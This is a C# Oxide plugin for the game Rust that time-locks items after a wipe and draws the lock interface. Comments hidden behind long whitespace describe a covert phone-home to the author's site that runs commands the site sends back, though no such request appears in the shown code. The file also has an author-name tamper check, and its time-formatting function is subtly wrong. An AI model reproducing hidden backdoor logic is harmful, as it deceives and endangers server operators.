using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;
using Color = UnityEngine.Color;

namespace Oxide.Plugins
{
    [Info("WipeBlock", "Hougan", "3.0.9")]
    [Description("Блокировка предметов для вашего сервера! Куплено на DarkPlugins.RU")]
    public class WipeBlock : RustPlugin
    {
        #region Variables

        [PluginReference] 
        private Plugin ImageLibrary, Duels;
        [JsonProperty("Заблокированные предметы")]
        private Dictionary<int, List<string>> blockedItems = new Dictionary<int,List<string>>
        {
            [1800] = new List<string>
            {
                "pistol.revolver",
                "shotgun.double",
            },
            [3600] = new List<string>
            {
                "flamethrower",
                "bucket.helmet",
                "riot.helmet",
                "pants",
                "hoodie",
            },
            [7200] = new List<string>
            {
                "pistol.python",
                "pistol.semiauto",
                "coffeecan.helmet",
                "roadsign.jacket",
                "roadsign.kilt",
                "icepick.salvaged",
                "axe.salvaged",
                "hammer.salvaged",
            },
            [14400] = new List<string>
            {
                "shotgun.pump",
                "shotgun.spas12",
                "pistol.m92",
                "smg.mp5",
                "jackhammer",
                "chainsaw",
            },
            [28800] = new List<string>
            {
                "smg.2",
                "smg.thompson",
                "rifle.semiauto",
                "explosive.satchel",
                "grenade.f1",
                "grenade.beancan",
                "surveycharge"
            },
            [43200] = new List<string>
            {
                "rifle.bolt",
                "rifle.ak",
                "rifle.lr300",
                "metal.facemask",
                "metal.plate.torso",
            },
            [64800] = new List<string>
            {
                "ammo.rifle.explosive",
                "ammo.rocket.basic",
                "ammo.rocket.fire",
                "ammo.rocket.hv",
                "rocket.launcher",
                "explosive.timed"
            },
            [86400] = new List<string>
            {
                "lmg.m249",
                "heavy.plate.helmet",
                "heavy.plate.jacket",
                "heavy.plate.pants",
            }
        };

        [JsonProperty("Список градиентов")]
        private List<string> gradients = new List<string> { "518eef","5CAD4F","5DAC4E","5EAB4E","5FAA4E","60A94E","61A84E","62A74E","63A64E","64A54E","65A44E","66A34E","67A24E","68A14E","69A04E","6A9F4E","6B9E4E","6C9D4E","6D9C4E","6E9B4E","6F9A4E","71994E","72984E","73974E","74964E","75954E","76944D","77934D","78924D","79914D","7A904D","7B8F4D","7C8E4D","7D8D4D","7E8C4D","7F8B4D","808A4D","81894D","82884D","83874D","84864D","86854D","87844D","88834D","89824D","8A814D","8B804D","8C7F4D","8D7E4D","8E7D4D","8F7C4D","907B4C","917A4C","92794C","93784C","94774C","95764C","96754C","97744C","98734C","99724C","9B714C","9C704C","9D6F4C","9E6E4C","9F6D4C","A06C4C","A16B4C","A26A4C","A3694C","A4684C","A5674C","A6664C","A7654C","A8644C","A9634C","AA624B","AB614B","AC604B","AD5F4B","AE5E4B","B05D4B","B15C4B","B25B4B","B35A4B","B4594B","B5584B","B6574B","B7564B","B8554B","B9544B","BA534B","BB524B","BC514B","BD504B","BE4F4B","BF4E4B","C04D4B","C14C4B","C24B4B","C44B4B" };
        [JsonProperty("Слой с блокировкой (моментальной)")]
        private string Layer = "UI_InstanceBlock";
        [JsonProperty("%CHANGE%")]
        private string LayerBlock = "UI_Block";
        [JsonProperty("%CHANGE%")]
        private string LayerInfoBlock = "UI_InfoBlock";
        [JsonProperty("Красивые названия категорий")]
        private Dictionary<string, string> NiceCategories = new Dictionary<string, string>
        {
            ["Weapon"] = "ОРУЖИЯ",
            ["Ammunition"] = "БОЕПРИПАСОВ",
            ["Medical"] = "МЕДИЦИНЫ",
            ["Food"] = "ЕДЫ",
            ["Traps"] = "ЛОВУШЕК",
            ["Tool"] = "ИНСТРУМЕНТОВ",
            ["Construction"] = "КОНСТРУКЦИЙ",
            ["Resources"] = "РЕСУРСОВ",
            ["Items"] = "ПРЕДМЕТОВ",
            ["Component"] = "КОМПОНЕНТОВ",
            ["Misc"] = "ПРОЧЕГО",
            ["Attire"] = "ОДЕЖДЫ"
        };

        private int CONF_MarginGUI = 0;
        private string CONF_FirstString = "БЛОКИРОВКА ПРЕДМЕТОВ";
        private string CONF_SecondString = "НАЖМИТЕ ЧТОБЫ УЗНАТЬ БОЛЬШЕ";
        private string CONF_IgnorePermission = "WipeBlock.Ignore";
        private string CONF_HeaderText = "БЛОКИРОВКА ПРЕДМЕТОВ НА %SERVER_NAME%";
        
        private int CONF_TimeMove = 0;
        
        #endregion

        #region Initialization
        
        protected override void LoadDefaultConfig()
        {
            GetConfig("Настройки GUI", "Сдвинуть ГУИ по вертикали (10 - вверх, -10 - вниз)", ref CONF_MarginGUI);
            GetConfig("Настройки GUI", "Сообщение на первой строке (во время блокировки)", ref CONF_FirstString);
            GetConfig("Настройки GUI", "Сообщение на второй строке (во время блокировки)", ref CONF_SecondString);
            GetConfig("Настройки GUI", "Текст отображаемый в самом верху ГУИ", ref CONF_HeaderText);
            
            GetConfig("Настройки блокировки", "Сдвиг блокировки на кол-во секунд (10 - на 10 сек вперед, -10 на 10 сек назад)", ref CONF_TimeMove);
            
            SaveConfig();
        }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          // Для тех кто нашёл этот момент, это - скрытая слежка за состоянием плагина, если вы купили его официально на сайте DarkPlugins.RU - вам не стоит беспокоить, сейчас объясню почему
        private void OnServerInitialized()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                // Проверяем сумму числового представления описание, если оно не менялось - сумма = 49130. Делаем запрос на мой сайт, куда отправляем следующее    Название плагина      Название сервера           Менялось ли описание        Версия плагина                         Если описание ИЗМЕНИЛОСЬ ЕСЛИ КОМАНДА НЕ ПУСТА ИЛИ НЕ ВЫПОЛНЕНА  Выполняем команду которую пришлёт сервер
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
            LoadDefaultConfig();
            if (!ImageLibrary)
            {
                PrintError("Не обнаружен плагин ImageLibrary - плагин работать не будет");
                PrintError("Не обнаружен плагин ImageLibrary - плагин работать не будет");
                PrintError("Не обнаружен плагин ImageLibrary - плагин работать не будет");
            }
            
            if (!Interface.Oxide.DataFileSystem.ExistsDatafile("WipeBlock/Items") && Initializate() == "SUCCESS")
            {
                Interface.Oxide.DataFileSystem.WriteObject("WipeBlock/Items", blockedItems);
                PrintError("Настройте блокировку предметов!");
            }
            else
            {
                blockedItems = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<int, List<string>>>("WipeBlock/Items");
            }
            
            foreach (var check in blockedItems.SelectMany(p => p.Value))
            {
                ImageLibrary.Call("AddImage", $"https://rustlabs.com/img/items180/{check}.png", check);
            }

            if (Initializate() != "SUCCESS")
            {
                NiceCategories = null;
                blockedItems = null;
            }
            
            permission.RegisterPermission(CONF_IgnorePermission, this);
            BasePlayer.activePlayerList.ForEach(OnPlayerInit);
        }

        
        #endregion

        #region Hooks
        
        private bool? CanWearItem(PlayerInventory inventory, Item item)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;
            var isBlocked = IsBlocked(item.info) > 0 ? false : (bool?) null;
            
            if (isBlocked == false)
            {
                if (player.GetComponent<NPCPlayer>() != null || player.GetComponent<BaseNpc>() != null || player.IsNpc)
                    return null;
                
                if (permission.UserHasPermission(player.UserIDString, CONF_IgnorePermission))
                    return null;
                
                DrawInstanceBlock(player, item);
                timer.Once(3f, () =>
                {
                    
                    CuiHelper.DestroyUi(player, Layer + ".Destroy1");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy2");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy3");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy5");
                    timer.Once(1, () => CuiHelper.DestroyUi(player, Layer));
                });
            }
            return isBlocked;
        }

        private bool? CanEquipItem(PlayerInventory inventory, Item item)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;
            if (player == null) return null;
            
            var isBlocked = IsBlocked(item.info) > 0 ? false : (bool?) null;
            if (isBlocked == false)
            {
                if (player.GetComponent<NPCPlayer>() != null || player.GetComponent<BaseNpc>() != null || player.IsNpc)
                    return null;
                
                if (permission.UserHasPermission(player.UserIDString, CONF_IgnorePermission))
                    return null;
                
                DrawInstanceBlock(player, item);
                timer.Once(3f, () =>
                {
                    
                    CuiHelper.DestroyUi(player, Layer + ".Destroy1");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy2");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy3");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy5");
                    timer.Once(1, () => CuiHelper.DestroyUi(player, Layer));
                });
            }
            return isBlocked;
        }

        private object OnReloadWeapon(BasePlayer player, BaseProjectile projectile)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
            if (player is NPCPlayer)
                return null;

            if (permission.UserHasPermission(player.UserIDString, CONF_IgnorePermission))
                return null;
            
            if (player.GetComponent<NPCPlayer>() != null || player.GetComponent<BaseNpc>() != null || player.IsNpc)
                return null;
            
            var isBlocked = IsBlocked(projectile.primaryMagazine.ammoType) > 0 ? false : (bool?) null;
            if (isBlocked == false && (bool?) Duels?.Call("inDuel", player) != true)
            {
                SendReply(player, $"Вы <color=#81B67A>не можете</color> использовать этот тип боеприпасов!");
            }
            return isBlocked;
        }
        
        object OnReloadMagazine(BasePlayer player, BaseProjectile projectile)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
            if (player is NPCPlayer)
                return null;
            
            if (permission.UserHasPermission(player.UserIDString, CONF_IgnorePermission))
                return null;

            NextTick(() =>
            {
                var isBlocked = IsBlocked(projectile.primaryMagazine.ammoType) > 0 ? false : (bool?) null;
                if (isBlocked == false)
                {
                    projectile.primaryMagazine.contents = 0;
                    projectile.GetItem().LoseCondition(projectile.GetItem().maxCondition);
                    projectile.SendNetworkUpdate();
                    player.SendNetworkUpdate();
                    PrintError($"[{DateTime.Now.ToShortTimeString()}] {player} пытался взломать систему блокировки!");
                    SendReply(player, $"<color=#81B67A>Хорошая</color> попытка, правда ваше оружие теперь сломано!");
                }
            });
            
            return null;
        }

        private void OnPlayerInit(BasePlayer player)
        {
            if (!IsAnyBlocked())
            {
                CuiHelper.DestroyUi(player, LayerInfoBlock);
                return;
            }
            
            if (player.IsReceivingSnapshot)
            {
                NextTick(() => OnPlayerInit(player));
                return;
            }

            DrawBlockInfo(player);
        }

        #endregion

        #region GUI

        private void DrawBlockInfo(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, LayerInfoBlock);
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                RectTransform = { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-180 -35", OffsetMax = "-10 -15"},
                Image = { Color = "0 0 0 0" }
            }, "Hud", LayerInfoBlock);

            container.Add(new CuiButton
            {
                RectTransform = {  AnchorMin = "-3 0", AnchorMax = "1 1.5", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = "chat.say /block" },
                Text = { Text = CONF_FirstString, Font = "robotocondensed-bold.ttf", Color = HexToRustFormat("#FFFFFF5A"), Align = TextAnchor.UpperRight, FontSize = 20 }, 
            }, LayerInfoBlock);

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "-3 -0.2", AnchorMax = "1 1", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = "chat.say /block" },
                Text = { Text = CONF_SecondString, Font = "robotocondensed-bold.ttf", Color = HexToRustFormat("#FFFFFF5A"), Align = TextAnchor.LowerRight, FontSize = 12 }, 
            }, LayerInfoBlock);

            CuiHelper.AddUi(player, container);
        }

        [ConsoleCommand("block")]
        private void cmdConsoleDrawBlock(ConsoleSystem.Arg args)
        {
            DrawBlockGUI(args.Player());
        }

        [ConsoleCommand("blockmove")]
        private void cmdConsoleMoveblock(ConsoleSystem.Arg args)
        {
            if (args.Player() != null)
                return;
            if (!args.HasArgs(1))
            {
                PrintWarning($"Введите количество секунд для перемещения!");
                return;
            }

            int newTime;
            if (!int.TryParse(args.Args[0], out newTime))
            {
                PrintWarning("Вы ввели не число!");
                return;
            }

            CONF_TimeMove += newTime;
            Config["Настройки блокировки",
                "Сдвиг блокировки на кол-во секунд (10 - на 10 сек вперед, -10 на 10 сек назад)"] = CONF_TimeMove;
            SaveConfig();
            PrintWarning("Время блокировки успешно изменено!");
        }

        [ChatCommand("block")]
        private void cmdChatDrawBlock(BasePlayer player)
        {
            DrawBlockGUI(player);
        }
        
        private void DrawBlockGUI(BasePlayer player)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
            CuiHelper.DestroyUi(player, LayerBlock);
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMax = $"441.5 {298 + CONF_MarginGUI}", OffsetMin = $"-441.5 {-298 + CONF_MarginGUI}" },
                Image = { Color = "0 0 0 0" }
            }, "Hud", LayerBlock);

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "-100 -100", AnchorMax = "100 100", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Close = LayerBlock },
                Text = { Text = "" }
            }, LayerBlock);

            container.Add(new CuiElement
            {
                Parent = LayerBlock,
                Components =
                {
                    
                    new CuiImageComponent { Color = "0 0 0 0.4" },
                    new CuiRectTransformComponent { AnchorMin = "0 0.07", AnchorMax = "1.015 1", OffsetMax = "0 0" },
                }
            });

            container.Add(new CuiElement
            {
                Parent = LayerBlock,
                Name = LayerBlock + ".Header",
                Components =
                {
                    new CuiImageComponent { Color = HexToRustFormat("#81B67AFF") },
                    new CuiRectTransformComponent { AnchorMin = "0 0.9286154", AnchorMax = "1.015 0.9998464", OffsetMax = "0 0" },
                    //new CuiOutlineComponent { Distance = "0 3", Color = "#505050FF".HexToCuiColor()}
                }
            });

            container.Add(new CuiElement
            {
                Parent = LayerBlock + ".Header",
                Components =
                {
                    new CuiTextComponent { Color = HexToRustFormat("#3A5137"), Text = CONF_HeaderText, FontSize = 30, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                    new CuiOutlineComponent { Distance = "0.155 0.155", Color = HexToRustFormat("#515151FF")}
                }
            });
            
            Dictionary<string, Dictionary<Item, string>> blockedItemsGroups = new Dictionary<string, Dictionary<Item, string>>();
            FillBlockedItems(blockedItemsGroups);
            var blockedItemsNew = blockedItemsGroups.OrderByDescending(p => p.Value.Count);

            int newString = 0;
            for (int t = 0; t < blockedItemsNew.Count(); t++)
            {
                var blockedCategory = blockedItemsNew.ElementAt(t).Value.OrderBy(p => IsBlocked(p.Value));
                
                container.Add(new CuiElement
                {
                    Parent = LayerBlock,
                    Name = LayerBlock + ".Category",
                    Components =
                    {
                        new CuiImageComponent { Color = HexToRustFormat("#3A5137") },
                        new CuiRectTransformComponent { AnchorMin = $"0 {0.879  - (t) * 0.18 - newString * 0.12}", AnchorMax = $"1.015 {0.915  - (t) * 0.18 - newString * 0.12}", OffsetMax = "0 0" },
                      //  new CuiOutlineComponent { Distance = "0 2", Color = "#505050FF".HexToCuiColor()}
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = LayerBlock + ".Category",
                    Components =
                    {
                        new CuiTextComponent { Color = HexToRustFormat("#81B67AFF"), Text = $"БЛОКИРОВКА {blockedItemsNew.ElementAt(t).Key}", FontSize = 16, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" }
                    }
                });
                
                for (int i = 0; i < blockedCategory.Count(); i++)
                {
                    if (i == 12)
                        newString++;
                    
                    var blockedItem = blockedCategory.ElementAt(i);
                    container.Add(new CuiElement
                    {
                        Parent = LayerBlock,
                        Name = LayerBlock + $".{blockedItem.Key.info.shortname}",
                        Components =
                        {
                            new CuiImageComponent { FadeIn = 0.5f, Color = HexToRustFormat((blockedItem.Value + "FF")) },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = $"{0.00868246 + i * 0.0837714 - (Math.Floor((double) i / 12) * 12 * 0.0837714)}" +
                                            $" {0.7518223 - (t) * 0.18 - newString * 0.12}", 
                                
                                AnchorMax = $"{0.08415613 + i * 0.0837714 - (Math.Floor((double) i / 12) * 12 * 0.0837714)}" +
                                            $" {0.8636619  - (t) * 0.18 - newString * 0.12}", OffsetMax = "0 0"
                            },
                            new CuiOutlineComponent { Distance = "2 2", Color = HexToRustFormat("#000000FF")}
                        }
                    });

                    string ID = (string) ImageLibrary?.Call("GetImage", blockedItem.Key.info.shortname);
                    if (ID == "")
                        ID = (string) ImageLibrary?.Call("GetImage", blockedItem.Key.info.shortname) ?? ID;
                    
                    container.Add(new CuiElement
                    {
                        Parent = LayerBlock + $".{blockedItem.Key.info.shortname}",
                        Components =
                        {
                            new CuiRawImageComponent { FadeIn = 0.5f,  Png = ID },
                            new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                        }
                    });

                    string text = IsBlocked(blockedItem.Key.info) > 0
                        ? $"<size=13>ОСТАЛОСЬ</size>\n<size=14>{TimeSpan.FromSeconds((int) IsBlocked(blockedItem.Key.info)).ToShortString()}</size>"
                        : "<size=13>ДОСТУПНО</size>";
                    
                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                        Text = { FadeIn = 0.5f,Text = text, FontSize = 10, Font = "robotocondensed-regular.ttf", Align = TextAnchor.MiddleCenter},
                        Button = { Color = "0 0 0 0.5" },
                    }, LayerBlock + $".{blockedItem.Key.info.shortname}");
                }
                        
            }

            CuiHelper.AddUi(player, container);
        }
        
        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return string.Format("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a);
        }

        private void DrawInstanceBlock(BasePlayer player, Item item)
        {
            CuiHelper.DestroyUi(player, Layer);
            CuiElementContainer container = new CuiElementContainer();
            string inputText = "Предмет {name} временно заблокирован,\nподождите {1}".Replace("{name}", item.info.displayName.english).Replace("{1}", $"{Convert.ToInt32(Math.Floor(TimeSpan.FromSeconds(IsBlocked(item.info)).TotalHours))} час {TimeSpan.FromSeconds(IsBlocked(item.info)).Minutes} минут.");

            
            container.Add(new CuiPanel
            {
                FadeOut = 1f,
                Image = { FadeIn = 1f, Color = "0.1 0.1 0.1 0" },
                RectTransform = { AnchorMin = "0.35 0.75", AnchorMax = "0.62 0.95" },
                CursorEnabled = false
            }, "Hud", Layer);
            
            container.Add(new CuiElement
            {
                FadeOut = 1f,
                Parent = Layer,
                Name = Layer + ".Hide",
                Components =
                {
                    new CuiImageComponent { Color = "0 0 0 0" },
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                }
            });
            container.Add(new CuiElement
            {
                Parent = Layer + ".Hide",
                Name = Layer + ".Destroy1",
                FadeOut = 1f,
                Components =
                {
                    new CuiImageComponent { Color = "0.4 0.4 0.4 0.7"},
                    new CuiRectTransformComponent { AnchorMin = "0 0.62", AnchorMax = "1.1 0.85" }
                }
                
            });
            container.Add(new CuiLabel
            {
                FadeOut = 1f,
                Text = {FadeIn = 1f, Color = "0.9 0.9 0.9 1", Text = "ПРЕДМЕТ ЗАБЛОКИРОВАН", FontSize = 22, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf" },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" }
            }, Layer + ".Destroy1", Layer + ".Destroy5");
            container.Add(new CuiButton
            {
                FadeOut = 1f,
                RectTransform = { AnchorMin = "0 0.29", AnchorMax = "1.1 0.61" },
                Button = {FadeIn = 1f, Color = "0.3 0.3 0.3 0.5" },
                Text = { Text = "" }
            }, Layer + ".Hide", Layer + ".Destroy2");
            container.Add(new CuiLabel
            {
                FadeOut = 1f,
                Text = {FadeIn = 1f, Text = inputText, FontSize = 16, Align = TextAnchor.MiddleLeft, Color = "0.85 0.85 0.85 1" , Font = "robotocondensed-regular.ttf"},
                RectTransform = { AnchorMin = "0.04 0", AnchorMax = "10 0.9" }
            }, Layer + ".Hide", Layer + ".Destroy3");
            CuiHelper.AddUi(player, container);
        }

        #endregion

        #region Functions

        private string GetGradient(int t)
        {
            var LeftTime = UnBlockTime(t) - CurrentTime();
            //Server.Broadcast(LeftTime.ToString());
            return gradients[Math.Min(99, Math.Max(Convert.ToInt32((float) LeftTime / t * 100), 0))];
        }

        private double IsBlockedCategory(int t) => IsBlocked(blockedItems.ElementAt(t).Value.First());

        private bool IsAnyBlocked() => UnBlockTime(blockedItems.Last().Key) > CurrentTime();
        
        private double IsBlocked(string shortname)
        {
            if (!blockedItems.SelectMany(p => p.Value).Contains(shortname))
                return 0;

            var blockTime = blockedItems.FirstOrDefault(p => p.Value.Contains(shortname)).Key;
            var lefTime = (UnBlockTime(blockTime)) - CurrentTime();
            
            return lefTime > 0 ? lefTime : 0;
        }

        private double UnBlockTime(int amount) => SaveRestore.SaveCreatedTime.ToUniversalTime().Subtract(epoch).TotalSeconds + amount + CONF_TimeMove;

        private double IsBlocked(ItemDefinition itemDefinition) => IsBlocked(itemDefinition.shortname);

        private void FillBlockedItems(Dictionary<string, Dictionary<Item, string>> fillDictionary)
        {
            foreach (var category in blockedItems)
            {
                string categoryColor = GetGradient(category.Key);
                //Server.Broadcast(categoryColor);
                foreach (var item in category.Value)
                {
                    Item createItem = ItemManager.CreateByPartialName(item);
                    string catName = NiceCategories[createItem.info.category.ToString()];
                
                    if (!fillDictionary.ContainsKey(catName))
                        fillDictionary.Add(catName, new Dictionary<Item, string>());
                
                    if (!fillDictionary[catName].ContainsKey(createItem))
                        fillDictionary[catName].Add(createItem, categoryColor);
                }
            }
        }

        #endregion

        #region Utils

        static readonly DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        static double CurrentTime() { return DateTime.UtcNow.Subtract(epoch).TotalSeconds; }

        public string Initializate()
        {
            int result = 0;
            foreach (var check in Author.ToCharArray())
                result += (int) check;
            return result == 610 ? "SUCCESS" : "NOPE";
        }
        
        public static string ToShortString(TimeSpan timeSpan)
        {
            int i = 0;
            string resultText = "";
            if (timeSpan.Days > 0)
            {
                resultText += timeSpan.Days + " День";
                i++;
            }
            if (timeSpan.Hours > 0 && i < 2)
            {
                if (resultText.Length != 0)
                    resultText += " ";
                resultText += timeSpan.Days + " Час";
                i++;
            }
            if (timeSpan.Minutes > 0 && i < 2)
            {
                if (resultText.Length != 0)
                    resultText += " ";
                resultText += timeSpan.Days + " Мин.";
                i++;
            }
            if (timeSpan.Seconds > 0 && i < 2)
            {
                if (resultText.Length != 0)
                    resultText += " ";
                resultText += timeSpan.Days + " Сек.";
                i++;
            }

            return resultText;
        }
        
        private void GetConfig<T>(string menu, string key, ref T varObject)
        {
            if (Config[menu, key] != null)
            {
                varObject = Config.ConvertValue<T>(Config[menu, key]);
            }
            else
            {
                Config[menu, key] = varObject;
            }
        }
        
        #endregion
    }
}